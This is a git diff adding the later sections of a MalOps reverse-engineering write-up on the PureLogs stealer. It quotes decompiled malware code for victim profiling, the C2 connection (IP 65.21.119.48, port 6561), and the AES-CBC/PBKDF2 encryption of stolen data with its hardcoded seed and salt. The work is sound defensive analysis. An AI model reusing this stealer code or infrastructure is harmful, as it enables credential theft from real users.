@@ -5,7 +5,6 @@ date: 2026-01-27
 tags: ['MalOps', 'Reverse', 'Malware']
 image: './banner.png'
 authors: ['enscribe']
-password: 'MalOps-26.01.27'
 ---
 
 import Callout from '@/components/Callout.astro'
@@ -808,3 +807,207 @@ internal static void smethod_3()
 > Telegram: It attempts to locate Telegram's tdata folder on the computer, then filters out some small, important files and compresses (zips) them into RAM.
 
 ### Task 11: PureLogs adds a unique tag to the stolen data before sending it to the attacker. What is the exact string it adds to identify this specific build of the malware?
+
+In `class10`, we see it performing a series of operations to gather information such as **username, domain name, CPU, RAM, Windows version,** etc.
+
+```csharp
+public static byte[] smethod_0()
+{
+    Class1 @class = Class1.smethod_1();
+    Class10.string_0 = @class.Country;
+    Dictionary<string, string> dictionary_ = new Dictionary<string, string>
+    {
+        {
+            "Username",
+            GClass0.GClass1.smethod_1()
+        },
+        {
+            "DomainName",
+            Environment.UserDomainName
+        },
+        {
+            "Date",
+            DateTime.Now.ToString()
+        },
+        {
+            "GPU",
+            Class10.smethod_1()
+        },
+        {
+            "CPU",
+            Class10.CPU()
+        },
+        {
+            "RAM",
+            Class10.RAM()
+        },
+        {
+            "WindowsVersion",
+            Class10.WindowsVersion()
+        },
+        {
+            "BitArch",
+            Class10.smethod_2()
+        },
+        {
+            "Antivirus",
+            Class10.smethod_4()
+        },
+        {
+            "ScreenSize",
+            Class10.smethod_5()
+        },
+        {
+            "Country",
+            @class.Country
+        },
+        {
+            "City",
+            @class.City
+        },
+        {
+            "Region",
+            @class.Region
+        },
+        {
+            "IP",
+            @class.IP
+        },
+        {
+            "TimeZone",
+            @class.method_2()
+        },
+        {
+            "ZIP",
+            @class.method_4()
+        }
+    };
+    return Encoding.UTF8.GetBytes(Class14.smethod_7(dictionary_));
+}
+```
+
+At `class13`, it collects all the information and stores it in the variable `dictionary_0`. Interestingly, this dictionary contains a **field called "group"** to represent the campaign/group tag.
+
+```csharp
+private static void Main(string[] args)
+{
+    ...
+    try
+    {
+        Class13.dictionary_0.Add("Group", GClass4.string_17);
+    }
+    catch
+    {
+
+    }
+    ...
+}
+```
+
+The tag stored in the variable `GClass4.string_17` has the value `test120922139213`.
+
+### Task 12: What port number does PureLogs use to communicate with its Command and Control (C2) server?
+
+Also in `class13`, after gathering enough information, the malware creates a new `TcpClient` object with the host and port parameters assigned to two variables, `GClass4.string_15` and `GClass4.string_16`.
+
+<div class="mx-auto">![Old TOC implementation](assets/task12-1.png)</div>
+
+```csharp
+    public static string string_15 = "65.21.119.48";
+    public static string string_16 = "6561";
+```
+
+### Task 13: What mode of AES does PureLogs use to encrypt stolen data?
+
+In `class14`, we can easily see the following encryption logic:
+
+```csharp
+internal static byte[] smethod_3(byte[] byte_0)
+{
+    byte[] array = Encoding.UTF8.GetBytes("lZl1wTrtsFc2ElgroUCsBHiSCgDJR10wV8SZ0IiP53cFzgsdKYIDGMdEHsogfICrEG6vsh");
+    array = SHA512.Create().ComputeHash(array);
+    return Class14.smethod_4(byte_0, array);
+}
+
+// Token: 0x060000FA RID: 250 RVA: 0x00009B4C File Offset: 0x00007D4C
+internal static byte[] smethod_4(byte[] byte_0, byte[] byte_1)
+{
+    byte[] result = null;
+    byte[] salt = new byte[]
+    {
+        117,
+        45,
+        158,
+        253,
+        184,
+        172,
+        96,
+        158,
+        239,
+        125,
+        30,
+        70,
+        145,
+        225,
+        3,
+        161
+    };
+    using (MemoryStream memoryStream = new MemoryStream())
+    {
+        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
+        {
+            rijndaelManaged.KeySize = 256;
+            rijndaelManaged.BlockSize = 128;
+            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
+            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.KeySize / 8.0));
+            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.BlockSize / 8.0));
+            rijndaelManaged.Mode = CipherMode.CBC;
+            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
+            {
+                cryptoStream.Write(byte_0, 0, byte_0.Length);
+                cryptoStream.Close();
+            }
+            result = memoryStream.ToArray();
+        }
+    }
+    return result;
+}
+```
+
+In the `smethod_3` function, it takes a hardcoded string as the **"secret seed"**. And it calls `smethod_4` to encrypt using **CBC mode** and default padding (PKCS7).
+
+### Task 14: What is the length (in bytes) of the derived Initialization Vector (IV) used in the encryption?
+
+In `smethod_4`:
+
+```csharp
+rijndaelManaged.BlockSize = 128;
+...
+rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.BlockSize / 8.0));
+```
+
+Therefore, the derived IV length is **16 bytes**.
+
+### Task 15: What algorithm is used to derive the AES key and IV from the SHA-512 hash in PureLogs?
+
+The algorithm used to derive the **AES key** and **IV** from the SHA-512 hash value in **PureLogs** is **PBKDF2** (Password-Based Key Derivation Function 2), in .NET implemented using the `Rfc2898DeriveBytes` class.
+
+```csharp
+Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
+```
+
+### Task 16: What fixed salt value is used in the PBKDF2 function in PureLogs (in hex starts as 0x)?
+
+As we analyzed above, the fixed Salt in PBKDF2 is a 16-byte array:
+
+```csharp
+[117, 45, 158, 253, 184, 172, 96, 158, 239, 125, 30, 70, 145, 225, 3, 161]
+```
+
+Converting to hexadecimal (starting with 0x) is: `0x752D9EFDB8AC609EEF7D1E4691E103A1`.
+
+## Conclusion
+
+Through reverse engineering of the **PureLogs Stealer** malware, we've uncovered a sophisticated information-stealing threat protected by **.NET Reactor 6.x** and equipped with extensive anti-analysis measures including VM/sandbox detection, debugger checks, and UAC bypass via COM elevation monikers. The malware harvests sensitive data from **Steam**, **Discord**, **Telegram**, and **FileZilla**, along with comprehensive system profiling information.
+
+All stolen data is encrypted using AES-256-CBC with PBKDF2-derived keys before transmission to the C2 server at `65.21.119.48:6561`, with the group tag `test120922139213` identifying this specific build. This professional-grade malware represents a significant threat to users storing credentials in legitimate applications, and defending against it requires monitoring for process masquerading, implementing credential management best practices, and maintaining detection signatures for .NET Reactor-packed executables.
